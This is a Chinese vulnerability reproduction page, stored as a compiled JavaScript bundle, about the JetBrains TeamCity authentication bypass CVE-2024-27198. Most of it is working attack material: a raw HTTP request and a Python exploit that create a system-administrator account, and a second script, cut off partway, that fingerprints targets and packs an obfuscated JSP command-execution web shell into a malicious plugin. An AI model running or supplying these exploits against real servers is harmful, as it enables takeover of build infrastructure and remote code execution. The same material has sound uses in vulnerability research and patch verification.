import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as i,c,a as n,b as s,d as t,e as p}from"./app-58e4a7d6.js";const l={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"TeamCity 是 JetBrains 开发的功能强大的持续集成和持续部署（CI/CD）服务器，支持包括 Java、C#、C/C++、PL/SQL、Cobol 等二十几种编程语言的代码质量管理与检测。",-1),k=n("p",null,"CVE-2024-27198 漏洞存在于 JetBrains TeamCity 中，是一个身份验证绕过漏洞。该漏洞可能使未经身份验证的攻击者能够通过 HTTP(S) 访问 TeamCity 服务器来绕过身份验证检查并获得对该 TeamCity 服务器的管理控制。",-1),d=n("p",null,"参考链接：",-1),v={href:"https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/",target:"_blank",rel:"noopener noreferrer"},m={href:"https://github.com/yoryio/CVE-2024-27198",target:"_blank",rel:"noopener noreferrer"},b={href:"https://github.com/W01fh4cker/CVE-2024-27198-RCE",target:"_blank",rel:"noopener noreferrer"},g=p(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>JetBrains TeamCity &lt; 2023.11.4
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;JET_BRAINS-TeamCity&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>执行如下命令启动一个 TeamCity 2023.11.3 服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker pull jetbrains/teamcity-server:2023.11.3
docker run -it -d --name teamcity -u root -p 8111:8111 jetbrains/teamcity-server:2023.11.3
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>服务启动后，需要打开 <code>http://your-ip:8111/</code> 并执行一系列初始化操作，创建一个管理员账户。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240718102244942.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,10),q={href:"https://github.com/yoryio/CVE-2024-27198",target:"_blank",rel:"noopener noreferrer"},_=p(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&gt; python CVE-2024-27198.py -t http://your-ip:8111/ -u userthr33 -p passthr33
[+] Version Found:  2023.11.3 (build 147512)
[+] Server vulnerable, returning HTTP 200
[+] New user userthr33 created succesfully! Go to http://your-ip:8111//login.html to login with your new credentials :)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240718102832266.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>使用创建的账号 <code>userthr33/passthr33</code> 登录：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240718102942369.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>或者手动发包：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /pwned?jsp=/app/rest/users;.jsp HTTP/1.1
Host: your-ip:8111
x-teamcity-client: Web UI
x-requested-with: XMLHttpRequest
Referer: http://your-ip:8111/profile.html
x-tc-csrf-token: a1f58037-7d9e-4934-9243-089e213c15e2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Content-Type: application/json
Content-Length: 161

{
  &quot;username&quot;: &quot;userthr331&quot;,
  &quot;password&quot;: &quot;passthr331&quot;,
  &quot;email&quot;: &quot;userthr331@npc.com&quot;,
  &quot;roles&quot;: { &quot;role&quot;: [{ &quot;roleId&quot;: &quot;SYSTEM_ADMIN&quot;, &quot;scope&quot;: &quot;g&quot; }] }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240718103838873.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>使用创建的账号 <code>userthr331/passthr331</code> 登录：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240718103859090.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞-poc" tabindex="-1"><a class="header-anchor" href="#漏洞-poc" aria-hidden="true">#</a> 漏洞 POC</h2>`,10),y={href:"https://github.com/yoryio/CVE-2024-27198",target:"_blank",rel:"noopener noreferrer"},h=p(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> urllib3
<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> re
urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span><span class="token punctuation">)</span>

parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-t&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--target&quot;</span><span class="token punctuation">,</span>required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;Target TeamCity Server URL&quot;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-u&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--username&quot;</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;Insert username for the new user&quot;</span><span class="token punctuation">)</span>
parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&quot;-p&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;--password&quot;</span><span class="token punctuation">,</span>required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&quot;Insert password for the new user&quot;</span><span class="token punctuation">)</span>
args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>

vulnerable_endpoint <span class="token operator">=</span> <span class="token string">&quot;/pwned?jsp=/app/rest/users;.jsp&quot;</span> <span class="token comment"># Attacker’s path to exploit CVE-2024-27198, please refer to the Rapid7&#39;s blogpost for more information</span>

<span class="token keyword">def</span> <span class="token function">check_version</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>args<span class="token punctuation">.</span>target<span class="token operator">+</span><span class="token string">&quot;/login.html&quot;</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> 
    repattern <span class="token operator">=</span> <span class="token string">r&#39;&lt;span class=&quot;vWord&quot;&gt;Version&lt;/span&gt;(.+?)&lt;/span&gt;&#39;</span> <span class="token comment"># Regex pattern to extract the TeamCity version number</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        version <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>repattern<span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Version Found:&quot;</span><span class="token punctuation">,</span> version<span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] Version not found&quot;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>args<span class="token punctuation">.</span>target<span class="token operator">+</span>vulnerable_endpoint<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>
    http_code <span class="token operator">=</span> response<span class="token punctuation">.</span>status_code
    <span class="token keyword">if</span> http_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Server vulnerable, returning HTTP&quot;</span><span class="token punctuation">,</span> http_code<span class="token punctuation">)</span> <span class="token comment"># HTTP 200 Status code is needed to confirm if the TeamCity Server is vulnerable to the auth bypass vuln</span>
        create_user <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;username&quot;</span><span class="token punctuation">:</span> args<span class="token punctuation">.</span>username<span class="token punctuation">,</span>
            <span class="token string">&quot;password&quot;</span><span class="token punctuation">:</span> args<span class="token punctuation">.</span>password<span class="token punctuation">,</span>
            <span class="token string">&quot;email&quot;</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>username<span class="token punctuation">}</span></span><span class="token string">@mydomain.com&quot;</span></span><span class="token punctuation">,</span>
            <span class="token string">&quot;roles&quot;</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">&quot;role&quot;</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">&quot;roleId&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;SYSTEM_ADMIN&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;scope&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;g&quot;</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token comment"># Given admin permissions to your new user, basically you can have complete control of this TeamCity Server</span>
        <span class="token punctuation">}</span>
        headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;application/json&quot;</span><span class="token punctuation">}</span>
        create_user <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>args<span class="token punctuation">.</span>target<span class="token operator">+</span>vulnerable_endpoint<span class="token punctuation">,</span> json<span class="token operator">=</span>create_user<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> <span class="token comment"># POST request to create the new user with admin privileges</span>
        <span class="token keyword">if</span> create_user<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] New user&quot;</span><span class="token punctuation">,</span> args<span class="token punctuation">.</span>username<span class="token punctuation">,</span> <span class="token string">&quot;created succesfully! Go to&quot;</span><span class="token punctuation">,</span> args<span class="token punctuation">.</span>target<span class="token operator">+</span><span class="token string">&quot;/login.html to login with your new credentials :)&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] Error while creating new user&quot;</span><span class="token punctuation">)</span>

    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] Probable not vulnerable, returning HTTP&quot;</span><span class="token punctuation">,</span> http_code<span class="token punctuation">)</span> 

check_version<span class="token punctuation">(</span><span class="token punctuation">)</span>
exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1),f={href:"https://github.com/W01fh4cker/CVE-2024-27198-RCE",target:"_blank",rel:"noopener noreferrer"},w=p(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> re
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> string
<span class="token keyword">import</span> random
<span class="token keyword">import</span> time
<span class="token keyword">import</span> zipfile
<span class="token keyword">import</span> urllib3
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> argparse
<span class="token keyword">from</span> faker <span class="token keyword">import</span> Faker
<span class="token keyword">import</span> xml<span class="token punctuation">.</span>etree<span class="token punctuation">.</span>ElementTree <span class="token keyword">as</span> ET
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote_plus

urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span><span class="token punctuation">)</span>
token_name <span class="token operator">=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
GREEN <span class="token operator">=</span> <span class="token string">&quot;\\033[92m&quot;</span>
RESET <span class="token operator">=</span> <span class="token string">&quot;\\033[0m&quot;</span>
session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">GetTeamCityVersion</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>
    get_teamcity_version_url <span class="token operator">=</span> target <span class="token operator">+</span> <span class="token string">&quot;/hax?jsp=/app/rest/server;.jsp&quot;</span>
    get_teamcity_version_headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&quot;</span>
    <span class="token punctuation">}</span>
    get_teamcity_version_response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>get_teamcity_version_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>get_teamcity_version_headers<span class="token punctuation">,</span>
                                                 proxies<span class="token operator">=</span>proxy<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">600</span><span class="token punctuation">)</span>
    root <span class="token operator">=</span> ET<span class="token punctuation">.</span>fromstring<span class="token punctuation">(</span>get_teamcity_version_response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    teamcity_version <span class="token operator">=</span> root<span class="token punctuation">.</span>attrib<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;version&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> teamcity_version

<span class="token keyword">def</span> <span class="token function">GetOSName</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>
    get_os_name_url <span class="token operator">=</span> target <span class="token operator">+</span> <span class="token string">&quot;/hax?jsp=/app/rest/debug/jvm/systemProperties;.jsp&quot;</span>
    get_os_name_headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&quot;</span>
    <span class="token punctuation">}</span>
    get_os_name_response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>get_os_name_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>get_os_name_headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxy<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>
                                        allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">600</span><span class="token punctuation">)</span>
    root <span class="token operator">=</span> ET<span class="token punctuation">.</span>fromstring<span class="token punctuation">(</span>get_os_name_response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    teamcity_info <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;arch&quot;</span><span class="token punctuation">:</span> root<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;.//property[@name=&#39;os.arch&#39;]&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;value&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">&quot;name&quot;</span><span class="token punctuation">:</span> root<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;.//property[@name=&#39;os.name&#39;]&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;value&quot;</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> teamcity_info<span class="token punctuation">[</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">GetUserID</span><span class="token punctuation">(</span>response_text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        root <span class="token operator">=</span> ET<span class="token punctuation">.</span>fromstring<span class="token punctuation">(</span>response_text<span class="token punctuation">)</span>
        user_info <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;username&quot;</span><span class="token punctuation">:</span> root<span class="token punctuation">.</span>attrib<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;username&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token string">&quot;id&quot;</span><span class="token punctuation">:</span> root<span class="token punctuation">.</span>attrib<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;id&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token string">&quot;email&quot;</span><span class="token punctuation">:</span> root<span class="token punctuation">.</span>attrib<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;email&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> user_info<span class="token punctuation">[</span><span class="token string">&quot;id&quot;</span><span class="token punctuation">]</span>
    <span class="token keyword">except</span> ET<span class="token punctuation">.</span>ParseError <span class="token keyword">as</span> err<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[-] Failed to parse user XML response: </span><span class="token interpolation"><span class="token punctuation">{</span>err<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">,</span> <span class="token string">&quot;!&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span>

<span class="token keyword">def</span> <span class="token function">GetOSVersion</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        get_os_name_url <span class="token operator">=</span> target <span class="token operator">+</span> <span class="token string">&quot;/hax?jsp=/app/rest/debug/jvm/systemProperties;.jsp&quot;</span>
        get_os_name_headers <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&quot;</span>
        <span class="token punctuation">}</span>
        get_os_name_response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>get_os_name_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>get_os_name_headers<span class="token punctuation">,</span>
                                            proxies<span class="token operator">=</span>proxy<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">600</span><span class="token punctuation">)</span>
        root <span class="token operator">=</span> ET<span class="token punctuation">.</span>fromstring<span class="token punctuation">(</span>get_os_name_response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        teamcity_info <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;arch&quot;</span><span class="token punctuation">:</span> root<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;.//property[@name=&#39;os.arch&#39;]&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;value&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token string">&quot;name&quot;</span><span class="token punctuation">:</span> root<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">&quot;.//property[@name=&#39;os.name&#39;]&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;value&quot;</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> teamcity_info<span class="token punctuation">[</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> err<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] Unable to obtain operating system version, please try manual exploitation.&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] Error in func &lt;GetOSVersion&gt;, error message: &quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">GenerateRandomString</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
    characters <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits
    <span class="token keyword">return</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>characters<span class="token punctuation">,</span> k<span class="token operator">=</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">GetEvilPluginZipFile</span><span class="token punctuation">(</span>shell_file_content<span class="token punctuation">,</span> plugin_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    fake_info <span class="token operator">=</span> Faker<span class="token punctuation">(</span>languages<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&quot;en&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    zip_resources <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>plugin_name<span class="token punctuation">}</span></span><span class="token string">.jar&quot;</span></span><span class="token punctuation">,</span> <span class="token string">&quot;w&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> shell_file_content <span class="token operator">==</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">:</span>
        evil_plugin_jsp <span class="token operator">=</span> <span class="token triple-quoted-string string">r&quot;&quot;&quot;&lt;%@ page pageEncoding=&quot;utf-8&quot;%&gt;
&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;
&lt;%
    String op=&quot;&quot;;
    String query = request.getParameter(&quot;cmd&quot;);
    String fileSeparator = String.valueOf(java.io.File.separatorChar);
    Boolean isWin;
    if(fileSeparator.equals(&quot;\\\\&quot;)){
        isWin = true;
    }else{
        isWin = false;
    }
    if (query != null) {
        ProcessBuilder pb;
        if(isWin) {
            pb = new ProcessBuilder(new String(new byte[]{99, 109, 100}), new String(new byte[]{47, 67}), query);
        }else{
            pb = new ProcessBuilder(new String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), new String(new byte[]{45, 99}), query);
        }
        Process process = pb.start();
        Scanner sc = new Scanner(process.getInputStream()).useDelimiter(&quot;\\\\A&quot;);
        op = sc.hasNext() ? sc.next() : op;
        sc.close();
    }
%&gt;
&lt;%= op %&gt;
&quot;&quot;&quot;</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        evil_plugin_jsp <span class="token operator">=</span> shell_file_content
    evil_plugin_xml <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;teamcity-plugin xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:noNamespaceSchemaLocation=&quot;urn:schemas-jetbrains-com:teamcity-plugin-v1-xml&quot;&gt;
    &lt;info&gt;
        &lt;name&gt;</span><span class="token interpolation"><span class="token punctuation">{</span>plugin_name<span class="token punctuation">}</span></span><span class="token string">&lt;/name&gt;
        &lt;display-name&gt;</span><span class="token interpolation"><span class="token punctuation">{</span>plugin_name<span class="token punctuation">}</span></span><span class="token string">&lt;/display-name&gt;
        &lt;description&gt;</span><span class="token interpolation"><span class="token punctuation">{</span>fake_info<span class="token punctuation">.</span>sentence<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">&lt;/description&gt;
        &lt;version&gt;1.0&lt;/version&gt;
        &lt;vendor&gt;
            &lt;name&gt;</span><span class="token interpolation"><span class="token punctuation">{</span>fake_info<span class="token punctuation">.</span>company<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">&lt;/name&gt;
            &lt;url&gt;</span><span class="token interpolation"><span class="token punctuation">{</span>fake_info<span class="token punctuation">.</span>url<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">&lt;/url&gt;
        &lt;/vendor&gt;
    &lt;/info&gt;
    &lt;deployment use-separate-classloader=&quot;true&quot; node-responsibilities-aware=&quot;true&quot;/&gt;
&lt;/teamcity-plugin&gt;&quot;&quot;&quot;</span></span>
    zip_resources<span class="token punctuation">.</span>writestr<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;buildServerResources/</span><span class="token interpolation"><span class="token punctuation">{</span>plugin_name<span class="token punctuation">}</span></span><span class="token string">.jsp&quot;</span></span><span class="token punctuation">,</span> evil_plugin_jsp<span class="token punctuation">)</span>
    zip_resources<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    zip_plugin <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>plugin_name<span class="token punctuation">}</span></span><span class="token string">.zip&quot;</span></span><span class="token punctuation">,</span> <span class="token string">&quot;w&quot;</span><span class="token punctuation">)</span>
